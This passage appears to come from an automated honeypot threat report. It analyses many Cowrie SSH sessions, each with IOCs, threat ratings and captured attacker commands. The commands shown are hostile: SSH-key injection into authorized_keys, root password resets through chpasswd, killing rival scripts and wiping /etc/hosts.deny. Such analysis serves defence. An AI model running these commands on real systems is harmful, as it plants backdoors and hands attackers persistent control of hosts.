- **Permission changes** – `chmod -R go= ~/.ssh`.
- **System reconnaissance** – commands like `cat /proc/cpuinfo`, `free -m`, `ls`, `uname`, `top`, `df`.

**Indicators of Compromise (IOCs):**
- Attacker IP: 104.208.108.166  
- Hard‑coded RSA public key string (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- File path: `.ssh/authorized_keys` on the honeypot.

**Threat Level:** **High** – the attacker successfully installed a backdoor and attempted to collect system data, indicating potential for persistent compromise.  

**Brief Summary:** The attacker injected a malicious SSH key into the host’s `authorized_keys`, hid the `.ssh` directory, and performed basic reconnaissance to prepare for remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nDE3Iz9AnxSV7\nDE3Iz9AnxSV7"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nDE3Iz9AnxSV7\nDE3Iz9AnxSV7\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 1b93b63a2c9f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 36.95.221.140

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain persistent remote access by adding a rogue SSH key and resetting the root password.  
**Techniques:**  
- `chattr -ia`/`lockr` to lock the `.ssh` directory (attempted protection).  
- Removal/recreation of `.ssh`, insertion of an RSA public key (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...`).  
- `chpasswd` to set root password to “uThPx3DjOKre”.  
- System‑info gathering (CPU, memory, OS, uptime, etc.) for profiling.  
**Indicators of Compromise (IOCs):**  
- IP: 36.95.221.140 (Indonesia).  
- RSA key string in `/home/.ssh/authorized_keys`.  
- Modification of `/etc/hosts.deny` (empty file).  
- Use of `chpasswd`, `lockr`, `chmod -R go= ~/.ssh`.  
**Threat Level:** Medium‑High – root password change and SSH key injection give full control.  
**Brief Summary:** The attacker injected a malicious SSH key into the honeypot’s authorized_keys, reset the root password, and collected system information to prepare for remote exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:uThPx3DjOKre"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 81460fb7b456...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 43.128.149.159

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Install an unauthorized SSH key (and attempt to change the local user’s password) while gathering system information for further exploitation.  

**Techniques & Tools Used:**
- `chattr -ia` and `lockr -ia` to hide the `.ssh` directory from normal visibility.
- Creation of a new `.ssh` folder, writing a public SSH key into `authorized_keys`, and setting restrictive permissions (`chmod -R go= ~/.ssh`).
- Multiple attempts to change the local UNIX password via `passwd`.
- System reconnaissance commands: `cat /proc/cpuinfo`, `free -m`, `ls`, `crontab`, `w`, `uname`, `lscpu`, `df`.

**Indicators of Compromise (IOCs):**
- Attacker IP: **43.128.149.159**  
- SSH public key string (the long RSA key) – can be hashed or stored for detection.  
- File path: `.ssh/authorized_keys` on the honeypot.

**Threat Level:** Medium – the attacker successfully installed a backdoor and attempted to alter credentials, indicating potential for unauthorized access.

**Brief Summary:** The session shows an attacker installing an SSH key to gain remote access, attempting to change local user passwords, and collecting system details for reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "password\nRZpHYmNMGupg\nRZpHYmNMGupg"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "password\nRZpHYmNMGupg\nRZpHYmNMGupg\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: dddf075f25a2...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 177.54.62.66

#### Analysis

**Attack Type:** Backdoor installation / remote shell setup  
**Objective:** Gain persistent root access via SSH key injection and password reset; conceal malicious processes.  

**Techniques Used:**
- `chattr -ia .ssh` & `lockr -ia .ssh`: lock the `.ssh` directory to prevent tampering.
- `mkdir .ssh && echo … > .ssh/authorized_keys`: inject a public SSH key for remote access.
- `chmod -R go= ~/.ssh`: restrict permissions on the SSH folder.
- `echo "root:SnEd7zyLpLzt"|chpasswd|bash`: set root password to a known value.
- Killing temporary scripts (`secure.sh`, `auth.sh`) and processes (`sleep`).
- System reconnaissance commands (cpuinfo, free, ls, crontab, w, uname, top, whoami, lscpu, df) to gather host details.

**Indicators of Compromise (IOCs):**
- Attacker IP: **177.54.62.66**  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: **SnEd7zyLpLzt** (plain text, not hashed).  

**Threat Level:** **High** – root access and SSH key injection provide full control over the system.  

**Brief Summary:** The attacker injected an SSH public key and set a known root password to establish persistent remote access while attempting to conceal malicious processes, indicating a sophisticated backdoor installation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:SnEd7zyLpLzt"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 8c31056fbe03...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 162.223.91.130

#### Analysis

**Attack Type:** Backdoor installation / unauthorized access  
**Objective:** Gain persistent root access via an injected SSH key and password reset, while removing potential existing malware (e.g., `secure.sh`, `auth.sh`).  

**Techniques Used:**
- **SSH Key Injection:** Created a new `.ssh/authorized_keys` entry with a random RSA public key.  
- **Root Password Reset:** `chpasswd` to set root password (`root:D2ieHlnmg93j`).  
- **Process Termination & Host Deny:** `pkill -9` on suspicious scripts and `echo > /etc/hosts.deny`.  
- **System Reconnaissance:** CPU, memory, disk usage, OS details via `/proc/cpuinfo`, `free`,

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:D2ieHlnmg93j"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: e9322995810b...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.14.33.177

#### Analysis

**Attack Type:** Backdoor installation + reconnaissance  
**Objective:** Gain remote access via a pre‑installed SSH key while gathering system details for later exploitation.  

**Techniques & Tools Used:**  
- Manipulation of the `~/.ssh` directory (chattr, lockr, rm/mkdir) and injection of an RSA public key into `authorized_keys`.  
- Setting restrictive permissions (`chmod -R go= ~/.ssh`).  
- System‑information gathering commands (`cpuinfo`, `free`, `ls`, `crontab`, `w`, `uname`, `top`, `whoami`, `lscpu`, `df`).  
- Attempted password change via `passwd` (likely failed due to interactive prompts).  

**Indicators of Compromise (IOCs):**  
- RSA key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `~/.ssh/authorized_keys`  

**Threat Level:** Medium – the attacker successfully installed a backdoor and collected system data, but no evidence of malware execution or large-scale exploitation.

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory to establish remote access while performing basic system reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\nSASFZ1Vi9kxJ\nSASFZ1Vi9kxJ"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1234\nSASFZ1Vi9kxJ\nSASFZ1Vi9kxJ\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 12c57ebef115...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.83.162.167

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged access by injecting an SSH key into the host’s `authorized_keys` file and changing the root password.  
**Techniques:**  
- Use of `chattr`, `lockr`, and `chmod` to protect the `.ssh` directory.  
- Direct echo of a public RSA key into `authorized_keys`.  
- Password change via `passwd` command (multiple attempts).  
- System reconnaissance commands (`cat /proc/cpuinfo`, `free -m`, `uname`, `top`, etc.) to profile the target.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **202.83.162.167**  
- RSA public key string (base64‑encoded) inserted into `.ssh/authorized_keys`.  
- No external URLs or payload downloads observed.  

**Threat Level:** Medium – the attacker successfully installed a backdoor and altered credentials, but no additional malicious payload was detected.  

**Brief Summary:** The attacker injected an SSH key and changed the root password to gain privileged access, while collecting system information for profiling.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "password\nqGj1nx8FJBdX\nqGj1nx8FJBdX"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "password\nqGj1nx8FJBdX\nqGj1nx8FJBdX\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: b85681cf99a6...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 43.128.149.159

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection  
**Objective:** Gain remote SSH access to the honeypot host and gather system information for further exploitation.  

**Techniques Used:**  
- Creation of `.ssh` directory and insertion of a malicious RSA public key into `authorized_keys`.  
- Modification of file permissions (`chmod -R go= ~/.ssh`).  
- Password manipulation attempts on user “wpuser” (using `passwd`).  
- System reconnaissance commands: CPU info, memory usage, filesystem details, crontab listings, uptime, and other OS identifiers.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **43.128.149.159** (South Korea).  
- RSA public key string in the `authorized_keys` file (the long base‑64 string).  
- Commands such as `lockr -ia .ssh`, which may indicate a custom tool or script used for locking files.  

**Threat Level:** **Medium** – The attacker demonstrates moderate sophistication by injecting an SSH key and performing basic reconnaissance, but no evidence of payload download or cryptomining activity.

**Brief Summary:**  
The attacker injected a malicious SSH key into the honeypot’s `authorized_keys` file to establish remote access, while also collecting system information for potential further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "wpuser\nEfwGAOIT0I3z\nEfwGAOIT0I3z"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "wpuser\nEfwGAOIT0I3z\nEfwGAOIT0I3z\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: c5bf47e9748c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.83.162.167

#### Analysis

**1. Attack Type**  
Backdoor installation (SSH key injection + root password change) with reconnaissance.

**2. Objective**  
Gain remote privileged access to the system and establish a persistent foothold.

**3. Techniques**  
- SSH key injection (`authorized_keys` modification).  
- File attribute locking (`chattr`, `lockr`).  
- Root password reset via `chpasswd`.  
- Process termination (`pkill -9`) and hosts.deny manipulation.  
- System reconnaissance (CPU, memory, OS info).

**4. Indicators of Compromise (IOCs)**  
- Attacker IP: 202.83.162.167 (Pakistan).  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ShHN5lN9P0Wf"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: d64fc1327af4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 14.103.123.67

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain remote, privileged (root) access via SSH key injection and password reset.  

**Techniques & Tools Used:**
- `chattr`/`lockr` to lock `.ssh` directory
- Creation of a new `.ssh` folder with an injected RSA public key (`authorized_keys`)
- `chmod -R go= ~/.ssh` to restrict permissions
- `chpasswd` to change root password (`root:Tyeo4sS1Mpby`)
- Process killing (`pkill -9`) and host deny modification (`echo > /etc/hosts.deny`) to hide activity

**Indicators of Compromise (IOCs):**
- Attacker IP: **14.103.123.67**  
- SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- File modifications: `/etc/hosts.deny`, `~/.ssh/authorized_keys`

**Threat Level:** **High** – attacker achieved root access and installed a persistent backdoor.

**Brief Summary:** The attacker injected an SSH key, reset the root password, and locked the `.ssh` directory to establish a privileged backdoor on the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Tyeo4sS1Mpby"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: d301d7f73de6...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.49.79

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain remote access via SSH by injecting a new authorized‑key and possibly alter user credentials.  
**Techniques:**  
- `lockr -ia .ssh` (likely a tool to hide or lock files)  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA key  
- Permission changes (`chmod -R go= ~/.ssh`)  
- Password manipulation via `passwd` with echoed input  
- System reconnaissance commands (`cat /proc/cpuinfo`, `free`, `uname`, etc.)  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.49.79**  
- RSA key string in `.ssh/authorized_keys`: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File `.ssh/authorized_keys` and commands `lockr -ia .ssh`.  

**Threat Level:** Medium – the attacker has successfully installed a backdoor and attempted credential changes, but no payload download or advanced exploitation was observed.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s authorized‑keys file, attempted to change user passwords, and performed system reconnaissance, indicating a backdoor installation attempt.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "devpass\nYYkxKZFlDtue\nYYkxKZFlDtue"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "devpass\nYYkxKZFlDtue\nYYkxKZFlDtue\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: f01d6c98e6db...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.219.202

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection)  
**Objective:** Gain remote access to the host via a newly created SSH key and set a password, while collecting basic system information for reconnaissance.  

**Techniques & Tools Used:**
- `chattr`, `lockr` to lock the `.ssh` directory
- Creation of an RSA public key in `authorized_keys`
- `chmod -R go= ~/.ssh` to restrict permissions
- Password change via `passwd` (multiple attempts)
- System information gathering (`cat /proc/cpuinfo`, `free`, `uname`, `top`, etc.)  

**Indicators of Compromise (IOCs):**
- Attacker IP: **45.78.219.202**  
- RSA public key string in the authorized_keys file (e.g., `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...")`  
- File paths: `~/.ssh/authorized_keys`, `~/.ssh`  

**Threat Level:** **High** – the attacker successfully installs a persistent SSH backdoor, enabling remote control and potential further exploitation.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh` directory, set a new password, and collected system metrics to prepare for future remote access or reconnaissance.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "password\nKjMHr4lMavpA\nKjMHr4lMavpA"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "password\nKjMHr4lMavpA\nKjMHr4lMavpA\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 6d55dcd1d562...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.14.33.177

#### Analysis

**Attack Type:** Backdoor installation / SSH key injection  
**Objective:** Gain persistent remote access by adding an authorized SSH key and attempting to modify user credentials.  
**Techniques:**  
- Creation of `.ssh` directory, setting permissions (`chmod -R go= ~/.ssh`).  
- Injection of a public RSA key into `authorized_keys`.  
- Use of `passwd` with echoed passwords to attempt password changes.  
- System reconnaissance commands (CPU info, memory, uptime, etc.) to gather host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.14.33.177**  
- SSH public key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `.ssh/authorized_keys`  

**Threat Level:** **High** – the attacker has established a persistent backdoor and attempted credential manipulation, posing significant risk.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s authorized keys and tried to alter user passwords, indicating a malicious attempt to gain remote access and control over the system.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\n4uBs1t9lS9fu\n4uBs1t9lS9fu"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\n4uBs1t9lS9fu\n4uBs1t9lS9fu\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: c706273d1739...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 202.83.162.167

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) combined with reconnaissance  
**Objective:** Gain SSH access to the host and gather system details for future exploitation or botnet recruitment.  

**Techniques & Tools Used:**
- `chattr`, `lockr` – file attribute manipulation/locking  
- `rm -rf .ssh && mkdir .ssh` – reset SSH directory  
- `echo … > ~/.ssh/authorized_keys` – inject a hard‑coded RSA public key  
- `chmod -R go= ~/.ssh` – restrict permissions  
- `passwd` – set password for user “wpuser”  
- System info commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, etc.) – reconnaissance  

**Indicators of Compromise (IOCs):**
- IP: **202.83.162.167** (attacker)  
- RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- User: **wpuser**  

**Threat Level:** Medium – moderate sophistication with potential for remote exploitation.  

**Brief Summary:** The attacker injected an SSH key to establish a backdoor, set a password for a new user, and performed extensive system reconnaissance to prepare for further exploitation or botnet recruitment.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "wpuser\nCA2OrZmKqoWI\nCA2OrZmKqoWI"|passwd|bash
Enter new UNIX password:
Enter new UNIX password: 
echo "wpuser\nCA2OrZmKqoWI\nCA2OrZmKqoWI\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 505ca7d4bc6c...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 104.208.108.166

#### Analysis

**1. Attack Type:**  
Backdoor installation via SSH key injection (remote access setup).

**2. Objective:**  
Gain persistent remote control of the target machine by adding an authorized SSH key and gathering system information for future exploitation.

**3. Techniques & Tools Used:**
- `chattr -ia` / `lockr -ia` to lock file attributes (prevent tampering).
- Creation of `.ssh` directory, echoing a public RSA key into `authorized_keys`.
- Setting permissions (`chmod -R go= ~/.ssh`) to restrict access.
- System reconnaissance commands (`cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, etc.).
- Attempted password change via `passwd` (likely to set a weak password for easy login).

**4. Indicators of Compromise (IOCs):**
- Attacker IP: **104.208.108.166**  
- Public RSA key string embedded in the session (`ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).
- File paths manipulated: `~/.ssh`, `authorized_keys`.

**5. Threat Level:** Medium – the attacker establishes a backdoor but does not deploy additional malware or payloads.

**6. Brief Summary:**  
The attacker injected an SSH key into the honeypot, locked file attributes to prevent tampering, and performed extensive system reconnaissance, likely preparing for remote exploitation via SSH.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1234\n2nrGowsFwwOW\n2nrGowsFwwOW"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
